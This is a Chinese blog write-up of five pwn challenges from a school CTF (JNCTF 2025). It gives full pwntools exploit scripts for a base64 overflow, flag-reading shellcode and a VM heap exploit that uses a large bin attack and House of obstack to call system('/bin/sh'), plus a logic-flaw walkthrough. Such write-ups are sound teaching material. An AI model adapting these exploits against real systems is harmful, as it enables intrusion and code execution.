---
title: "JNCTF 2025"
description: "校赛的 PWN 算 ak 了,记录一下参加的最后一届校赛."
pubDate: 2025-03-27
category: wp
tags: [writeup]
---

## Signin

### 探索版

简单运行一下,发现只有几个功能
```
register    #注册
sign_in     #登录
sign_out    #登出
whoami      #输出用户名
help        #命令列表
quit        #退出
```

由于给了rust源代码,可以直接读代码(如果看不懂可以直接问ai)
又发现一点功能
```
unregister      #注销
become_admin    #成为管理员
get_flag        #获得flag
```

执行`get_flag`
回显`You are not signed in!`

要先登录
没号就注册吧
按照`help`里的提示
```
register asd 123    #用户名和密码随便给
sign_in asd 123     #登录刚才注册的用户
```

尝试`get_flag`
回显`You are not an admin!`

试试`become_admin`
回显`Are you root? (y/n)`
回个`y`
回显`You are not root, you cannot do this!`

貌似要用户名是root,尝试注册一个
```
register root 123
```
回显`Name already exists!`

试试直接注销
```
unregister root
```
成功了

注册为root,
```
register root 123
```

登录
```
sign_in root 123
```

然后`become_admin`
回显`Are you root? (y/n)`
回个`y`
回显`You are now an admin!`

然后`get_flag`


## ezbase

程序开了pie保护

玩了一下
是输入一段长度为$4k$ $(k \in Z^*)$的`base64`密文,
然后程序会输出明文和长度.

最多输入0x40,但是解密字符和输入是相邻的,
如果完全输入了0x40,就也会把解码后的当密文
就会继续解码,存在溢出
**(当然,溢出会有上限,不过存在后门函数,够用了)**


笔者用的溯源法,从最后的溢出字节反向还原
payload的构成,

需要base64解码三次才能溢出到返回地址.

```python
from pwn import *
import base64

context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

backdoor = p16(0x1181)

back = base64.b64encode(b'a'*4+backdoor)
info('back: ' + back.decode())
back = back.ljust(0x24,b'=')
# 等号补充是为了停止解码,防止过度溢出

back = base64.b64encode(back)
info('back: ' + back.decode())
back = base64.b64encode(back)
info('back: ' + back.decode())

io = process('./ezbase')
gdb.attach(io, 'b *$rebase(0x1474)')


io.recvuntil(b'Please input your secret:')
io.sendline(back)

io.interactive()
```

## shellcode_master?

很平常的shellcode题,但是清空了基本所有寄存器
`open`,`read`,`write`要找一个可写段.

发现mmap给的写shellcode的地址和可写段有固定偏移,
可以通过偏移找到其地址.

```python
from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
context.arch = 'amd64'

io = process('./sc_master')
gdb.attach(io, 'b *$rebase(0x1569)')

# 0x39000就是一个固定偏移
shellcode = '''mov rsp, r15
sub rsp, 0x39000
add rsp, 0x300

push 0x67616c66
mov rdi, rsp
mov rsi, 0
mov rdx, 0
mov rax, 2
syscall

mov rdi, rax
mov rsi, rsp
mov rdx, 0x100
mov rax, 0
syscall

mov rbx, rsp
label:

mov rdi, 1
mov rsi, rbx
mov rdx, 0x1
mov rax, 1
syscall

add rbx, 1
cmp byte ptr [rbx], 0
jne label

'''
shellcode = asm(shellcode)
io.sendline(shellcode)
print(io.recvall())
io.interactive()

```

## shellcode_master_revenge

> 据出题人本人所言,
> 上述解法为非预期解法
> 故revenge诞生.

大体没有改变,只是mmap的地址固定了,就是0x114514000.

可写段不能通过固定偏移寻找.
只能爆破.

```python
from pwn import *

# context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
context.arch = 'amd64'

#0x7ffe30734000是本地某一次运行时的栈地址
shellcode = '''mov r12, 0x7ffe30734000
label1:

mov rdi, 0
mov rsi, r12
mov rdx, 0x1
mov rax, 0
syscall
sub r12, 0x1000
cmp rax, 0x1

jne label1

mov rsp,r12
push 0x67616c66
mov rdi, rsp
mov rsi, 0
mov rdx, 0
mov rax, 2
syscall

mov rdi, rax
mov rsi, rsp
mov rdx, 0x100
mov rax, 0
syscall

mov rbx, rsp
label2:

mov rdi, 1
mov rsi, rbx
mov rdx, 0x1
mov rax, 1
syscall

add rbx, 1
cmp byte ptr [rbx], 0
jne label2
'''

shellcode = asm(shellcode)

print(len(shellcode))

io = process('./sc_master_revenge')
gdb.attach(io, 'b *$rebase(0x155A)')

io.recvuntil(b'Give me your shellcode: ')
io.sendline(shellcode)

while not io.recv(timeout=0.02):
    print(b'a')
    io.sendline(b'1')

print(io.recvall())
io.interactive()
```
由于是远程io,所有速度较慢.
关于这一点,事实上,可以优化,只是赛时没想到.

还有一点,这是一个概率出的脚本.
当stack地址大于我的假设地址,应该就跑不出来.

## hvm

一个`vm pwn`
需要手搓`opcode`

以下是一些可能用到的opcode
```
code_map = {
    'rd': b'\xd1',
    'wt': b'\xd2',
    'new': b'\xd3',
    'free': b'\xd4',
    'display': b'\xd5',
    'xor': b'\xe3',
    'inverse': b'\xe4',
    'shl': b'\xe5',
    'add': b'\xf1',
    'sub': b'\xf2',
}
```

申请的chunk索引为`0-15`,大小为`0x480-0x500`

但是读写数据为做检测
也就是说,申请的`0x480`的chunk,可以访问它`0x500`的内容.
这就是越界读写.

该题最后是glibc2.25

可以考虑使用`House of obstack`.

**PS: opcode是通过read函数读入的,有些字符无法读入**

```python
from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
context.arch = 'amd64'

libc = ELF('./libc.so.6')


io = process('./hvm')
# gdb.attach(io, 'b *$rebase(0x164b)')

libc_offset = 0x21b0f0
heap_offset = 0x480
IO_list_all = 0x21b680
IO_obstack_jump = 0x2173c0
system_offset = 0x50d70
binsh_offset = 0x1d8678
puts_offset = 0x80e50
ogg_offset = 0xebc81


payload = b'\xd3\x00\x80\x04'
payload += b'\xd3\x01\x80\x04'
payload += b'\xd3\x02\x90\x04'
payload += b'\xd4\x01'
payload += b'\xd3\x01\x90\x04'


'''
libc和heap的地址
'''
payload += b'\xd1\x00\x94\x04'
payload += b'\xd2\x00\x04\x00'
payload += b'\xd1\x00\x90\x04'
payload += b'\xf2'+p32(libc_offset)
payload += b'\xd2\x00\x00\x00'

payload += b'\xd1\x00\xa4\x04'
payload += b'\xd2\x00\x0c\x00'
payload += b'\xd1\x00\xa0\x04'
payload += b'\xf2'+p32(heap_offset)
payload += b'\xd2\x00\x08\x00'


# 准备chunk
payload += b'\xd3\x03\xa0\x04'
payload += b'\xd3\x04\x80\x04'  #防合并
payload += b'\xd3\x05\x80\x04'  #防合并



# 进行内容伪造
payload += b'\xd1\x00\x04\x00'
payload += b'\xd2\x02\x3c\x00'
payload += b'\xd1\x00\x00\x00'

payload += b'\xf1'+p32(binsh_offset)
payload += b'\xd2\x02\x38\x00'


payload += b'\xd1\x00\x04\x00'
payload += b'\xd2\x02\x2c\x00'

payload += b'\xd1\x00\x00\x00'
#以下就是绕过截断
payload += b'\xf1'+p32(system_offset-0x600)
payload += b'\xf1'+p32(0x600)
payload += b'\xd2\x02\x28\x00'


payload +=b'\xd1\x00\x04\x00'
payload +=b'\xd2\x02\xcc\x00'
payload +=b'\xd1\x00\x00\x00'
payload +=b'\xf1'+p32(IO_obstack_jump+0x20)
payload +=b'\xd2\x02\xc8\x00'

payload += b'\xd1\x00\x0c\x00'
payload += b'\xd2\x02\xd4\x00'
payload += b'\xd1\x00\x08\x00'
payload += b'\xf1'+p32(0x910)
payload += b'\xd2\x02\xd0\x00'



#large bins atk
payload += b'\xd4\x03'
payload += b'\xd3\x03\xb0\x04'
payload += b'\xd4\x02'

'''
edit
'''
payload += b'\xd1\x00\x04\x00'
payload += b'\xd2\x01\xbc\x04'
payload += b'\xd1\x00\x00\x00'
payload += b'\xf1'+p32(IO_list_all-0x20)
payload += b'\xd2\x01\xb8\x04'

payload += b'\xd3\x02\xc0\x04'


# 内容伪造的最后一部分
payload += b'\xd1\x00\x40\x00'
payload += b'\xf1'+p32(1)
payload += b'\xd2\x04\xd0\x04'

io.sendline(payload)

io.interactive()
```
